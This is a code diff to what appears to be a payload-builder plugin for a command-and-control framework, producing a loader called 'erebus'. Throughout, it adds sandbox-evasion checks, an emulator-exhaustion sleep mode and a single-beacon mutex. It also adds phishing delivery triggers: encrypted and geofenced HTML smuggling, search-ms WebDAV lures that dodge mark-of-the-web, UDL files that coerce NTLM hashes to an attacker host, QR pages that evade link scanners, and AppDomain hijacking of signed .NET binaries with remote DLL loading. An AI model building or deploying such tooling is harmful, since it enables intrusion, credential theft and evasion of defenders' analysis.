@@ -62,6 +62,11 @@ _REQUIRED_PLUGIN_FUNCTIONS = [
     "generate_redirector_configs",
     "create_decoy_document",
     "create_phishing_page",
+    "create_appdomain_config", "create_appdomain_remote_config", "get_appdomain_targets",
+    "create_searchms_trigger", "create_udl_trigger",
+    "create_qr_html_trigger",
+    "create_encrypted_html_smuggling_trigger", "create_geofenced_html_smuggling_trigger",
+    "salt_text",
 ]
 _missing = [n for n in _REQUIRED_PLUGIN_FUNCTIONS if n not in globals()]
 if _missing:
@@ -619,6 +624,66 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         ),
 
         BuildParameter(
+            name = "0.5f2 Check System Uptime",
+            parameter_type = BuildParameterType.Boolean,
+            description = (
+                "Reject environments where system uptime is below the configured minimum. "
+                "Sandbox VMs are typically spun up fresh per sample and have near-zero uptime; "
+                "a real workstation has been running for hours."
+            ),
+            default_value = False,
+            required = False,
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.5f3 Minimum Uptime Seconds",
+            parameter_type = BuildParameterType.String,
+            description = "Minimum system uptime in seconds required to proceed (default: 300 = 5 minutes).",
+            default_value = "300",
+            required = False,
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
+                HideCondition(name="0.5f2 Check System Uptime", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.5f4 Check Screen Resolution",
+            parameter_type = BuildParameterType.Boolean,
+            description = (
+                "Require a minimum screen resolution of 1280x1024. Sandboxes and analyst VMs "
+                "frequently use low-res virtual displays (800x600, 1024x768) to reduce overhead."
+            ),
+            default_value = False,
+            required = False,
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.5f5 Check Secure Boot",
+            parameter_type = BuildParameterType.Boolean,
+            description = (
+                "Require UEFI Secure Boot to be enabled (registry: HKLM\\SYSTEM\\CurrentControlSet\\"
+                "Control\\SecureBoot\\State, UEFISecureBootEnabled=1). Modern managed corporate "
+                "endpoints have Secure Boot on; most sandbox VMs and analyst machines disable it."
+            ),
+            default_value = False,
+            required = False,
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        BuildParameter(
             name = "0.5g Hostname Whitelist",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated list of allowed hostnames (e.g., TARGET-PC,VICTIM-WORKSTATION). Leave empty to disable.",
@@ -749,10 +814,29 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
                 "Pre-injection dwell mode.\n"
                 "None: no sleep (execute immediately).\n"
                 "Timer: WaitableTimer jittered dwell - bypasses sandbox Sleep() acceleration.\n"
-                "Ekko-lite: Timer + XOR-encrypt non-.text PE sections during wait (hides shellcode from memory scanners)."
+                "Ekko-lite: Timer + XOR-encrypt non-.text PE sections during wait (hides shellcode from memory scanners).\n"
+                "Exhaustion: Fibonacci burn + 100k CloseHandle API hammering + 100 MB memory touch, then WaitableTimer wait. "
+                "Exhausts emulator instruction/syscall budgets so automated sandboxes time out before behaviour is recorded. "
+                "Recommended base dwell: 90000 ms (90 seconds)."
             ),
-            choices = ["None", "Timer", "Ekko-lite"],
+            choices = ["None", "Timer", "Ekko-lite", "Exhaustion"],
             default_value = "None",
+            required = False,
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.5v Single Instance",
+            parameter_type = BuildParameterType.Boolean,
+            description = (
+                "Create a named Global\\ mutex on startup to prevent duplicate beacons. "
+                "Required for DLL-based loaders delivered via COM hijacking or Run-key persistence, "
+                "where the loader may be invoked multiple times before the first beacon checks in."
+            ),
+            default_value = False,
             required = False,
             hide_conditions = [
                 HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
@@ -884,7 +968,7 @@ appdomain (self)""",
             name="0.9 Trigger Type",
             parameter_type=BuildParameterType.ChooseOne,
             description=f"Type of Trigger to toggle decoy and execution. LNK Unavailabe in {semver}",
-            choices=["LNK", "BAT", "MSI", "MSC", "HTML", "ClickFix", "HTA", "URL", "JS", "CHM", "SVG"],
+            choices=["LNK", "BAT", "MSI", "MSC", "HTML", "ClickFix", "HTA", "URL", "JS", "CHM", "SVG", "HTML-Encrypted", "HTML-Geofenced", "SearchMS", "UDL", "QR", "AppDomain"],
             default_value="BAT",
             required=False,
             hide_conditions = [
@@ -954,6 +1038,124 @@ appdomain (self)""",
                 HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                 HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="URL"),
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9e HTML Password",
+            parameter_type=BuildParameterType.String,
+            description="Password required to decrypt and trigger the payload. Stored as PBKDF2 hash in HTML — prevents automated sandbox detonation.",
+            default_value="Passw0rd!",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="HTML-Encrypted"),
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9f Allowed Countries",
+            parameter_type=BuildParameterType.String,
+            description="Comma-separated ISO-3166-1 alpha-2 country codes to allow (e.g. US,GB,CA). Visitors outside these countries are redirected to the fallback URL.",
+            default_value="US,GB,CA,AU,DE,FR",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="HTML-Geofenced"),
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9g Geofence Fallback URL",
+            parameter_type=BuildParameterType.String,
+            description="URL to redirect blocked visitors to (e.g. https://www.microsoft.com). Leave blank for silent fail.",
+            default_value="https://www.microsoft.com",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="HTML-Geofenced"),
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9h WebDAV Host",
+            parameter_type=BuildParameterType.String,
+            description="Attacker-controlled WebDAV host for search-ms trigger (no scheme/port, e.g. dav.attacker.com).",
+            default_value="dav.attacker.com",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="SearchMS"),
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9i WebDAV Share",
+            parameter_type=BuildParameterType.String,
+            description="WebDAV share path (e.g. share). Files served from this share have no MOTW.",
+            default_value="share",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="SearchMS"),
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9j UDL Attacker Host",
+            parameter_type=BuildParameterType.String,
+            description="Attacker-controlled SMB listener hostname or IP for UDL Net-NTLM coercion.",
+            default_value="attacker.com",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="UDL"),
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9k QR Code URL",
+            parameter_type=BuildParameterType.String,
+            description="URL to encode in the QR code. The URL has no plaintext representation in the HTML source — defeats link scanner URL extraction.",
+            default_value="https://login.microsoftonline.com/",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="QR"),
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9l AppDomain Target EXE",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Signed .NET LOLBIN to target. The .config file must be placed alongside this EXE.",
+            choices=["AddInProcess64", "AddInProcess32", "dfsvc64", "AppLaunch", "ServiceHubHost"],
+            default_value="AddInProcess64",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="AppDomain"),
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9m AppDomain Remote URL",
+            parameter_type=BuildParameterType.String,
+            description="Optional remote URL to fetch the AppDomain Manager DLL (HTTP/S or WebDAV). Leave blank for local side-by-side DLL mode. Remote mode requires strong-name signing.",
+            default_value="",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="AppDomain"),
             ]
         ),
 
@@ -3488,6 +3690,11 @@ generated if none have been entered.""",
                         guardrails_check_hwbp = 1 if self.get_parameter("0.5e Check Hardware Breakpoints") else 0
                         guardrails_check_timing = 1 if self.get_parameter("0.5f Check Timing Anomalies") else 0
                         guardrails_check_sandbox = 1 if self.get_parameter("0.5f1 Check Sandbox Environment") else 0
+                        guardrails_check_uptime = 1 if self.get_parameter("0.5f2 Check System Uptime") else 0
+                        guardrails_uptime_min_sec = int(self.get_parameter("0.5f3 Minimum Uptime Seconds") or 300)
+                        guardrails_check_screen_res = 1 if self.get_parameter("0.5f4 Check Screen Resolution") else 0
+                        guardrails_check_secure_boot = 1 if self.get_parameter("0.5f5 Check Secure Boot") else 0
+                        single_instance = 1 if self.get_parameter("0.5v Single Instance") else 0
 
                         # Parse the list-based guardrail parameters and
                         # thread them into config.hpp. These render as
@@ -3535,13 +3742,18 @@ generated if none have been entered.""",
                                 parse_csv(self.get_parameter("0.5o Callstack Spoof Modules"))
                                 or ["ntdll.dll", "kernel32.dll", "kernelbase.dll"]
                             ),
-                            sleep_obfuscation_type={"None": 0, "Timer": 1, "Ekko-lite": 2}.get(
+                            sleep_obfuscation_type={"None": 0, "Timer": 1, "Ekko-lite": 2, "Exhaustion": 3}.get(
                                 self.get_parameter("0.5p Sleep Obfuscation"), 0),
                             sleep_obfuscation_base_ms=int(self.get_parameter("0.5q Sleep Base MS") or 5000),
                             sleep_obfuscation_jitter_ms=int(self.get_parameter("0.5r Sleep Jitter MS") or 3000),
                             amsi_bypass_type=int(self.get_parameter("0.5s AMSI Bypass Type") or 1),
                             etw_bypass_type=int(self.get_parameter("0.5t ETW Bypass Type") or 1),
                             unhook_scope=int(self.get_parameter("0.5u Unhook Scope") or 0),
+                            guardrails_check_uptime=guardrails_check_uptime,
+                            guardrails_uptime_min_seconds=guardrails_uptime_min_sec,
+                            guardrails_check_screen_resolution=guardrails_check_screen_res,
+                            guardrails_check_secure_boot=guardrails_check_secure_boot,
+                            single_instance=single_instance,
                         )
                         rendered_config = config_template.render(**config_data)
 
@@ -3816,7 +4028,7 @@ generated if none have been entered.""",
                         _hash_seed = f"0x{secrets.randbits(32):08X}"
                         _sw3 = 1 if self.get_parameter("0.5m Syscall Backend") == "SysWhispers3" else 0
                         _cs  = 1 if self.get_parameter("0.5n Callstack Spoofing") else 0
-                        _so_type = {"None": 0, "Timer": 1, "Ekko-lite": 2}.get(
+                        _so_type = {"None": 0, "Timer": 1, "Ekko-lite": 2, "Exhaustion": 3}.get(
                             self.get_parameter("0.5p Sleep Obfuscation"), 0)
                         _so_base = int(self.get_parameter("0.5q Sleep Base MS") or 5000)
                         _so_jitt = int(self.get_parameter("0.5r Sleep Jitter MS") or 3000)
@@ -4693,6 +4905,83 @@ generated if none have been entered.""",
                                 download_name=_svg_exe.name,
                                 obfuscate_b64=True,
                             )
+
+                        case "HTML-Encrypted":
+                            _enc_exe = payload_dir / "erebus.exe"
+                            for _ext in ("dll", "xll"):
+                                _cand = payload_dir / f"erebus.{_ext}"
+                                if _cand.exists():
+                                    _enc_exe = _cand
+                                    break
+                            trigger_path = create_encrypted_html_smuggling_trigger(
+                                payload_path=str(_enc_exe),
+                                password=str(self.get_parameter("0.9e HTML Password") or "Passw0rd!"),
+                                output_filename="document.html",
+                                download_name=_enc_exe.name,
+                                payload_dir=payload_dir,
+                            )
+
+                        case "HTML-Geofenced":
+                            _geo_exe = payload_dir / "erebus.exe"
+                            for _ext in ("dll", "xll"):
+                                _cand = payload_dir / f"erebus.{_ext}"
+                                if _cand.exists():
+                                    _geo_exe = _cand
+                                    break
+                            _countries_raw = str(self.get_parameter("0.9f Allowed Countries") or "US,GB,CA")
+                            _countries = [c.strip().upper() for c in _countries_raw.split(",") if c.strip()]
+                            _fallback = str(self.get_parameter("0.9g Geofence Fallback URL") or "https://www.microsoft.com")
+                            trigger_path = create_geofenced_html_smuggling_trigger(
+                                payload_path=str(_geo_exe),
+                                allowed_countries=_countries,
+                                fallback_url=_fallback,
+                                output_filename="document.html",
+                                download_name=_geo_exe.name,
+                                payload_dir=payload_dir,
+                            )
+
+                        case "SearchMS":
+                            trigger_path = create_searchms_trigger(
+                                webdav_host=str(self.get_parameter("0.9h WebDAV Host") or "dav.attacker.com"),
+                                webdav_share=str(self.get_parameter("0.9i WebDAV Share") or "share"),
+                                webdav_ssl=True,
+                                display_name="System Update",
+                                output_filename="document.html",
+                                payload_dir=payload_dir,
+                            )
+
+                        case "UDL":
+                            trigger_path = create_udl_trigger(
+                                attacker_host=str(self.get_parameter("0.9j UDL Attacker Host") or "attacker.com"),
+                                share_name="share",
+                                output_filename="database.udl",
+                                payload_dir=payload_dir,
+                            )
+
+                        case "QR":
+                            trigger_path = create_qr_html_trigger(
+                                url=str(self.get_parameter("0.9k QR Code URL") or "https://login.microsoftonline.com/"),
+                                output_filename="verify.html",
+                                payload_dir=payload_dir,
+                            )
+
+                        case "AppDomain":
+                            _ad_target_key = str(self.get_parameter("0.9l AppDomain Target EXE") or "AddInProcess64")
+                            _ad_targets = get_appdomain_targets()
+                            _ad_exe = _ad_targets.get(_ad_target_key, {}).get("exe", "AddInProcess.exe")
+                            _ad_remote_url = str(self.get_parameter("0.9m AppDomain Remote URL") or "").strip()
+                            if _ad_remote_url:
+                                trigger_path = create_appdomain_remote_config(
+                                    target_exe=_ad_exe,
+                                    dll_url=_ad_remote_url,
+                                    output_dir=payload_dir,
+                                    disable_etw=True,
+                                )
+                            else:
+                                trigger_path = create_appdomain_config(
+                                    target_exe=_ad_exe,
+                                    output_dir=payload_dir,
+                                )
 
                     if trigger_path:
                         response.status = BuildStatus.Success
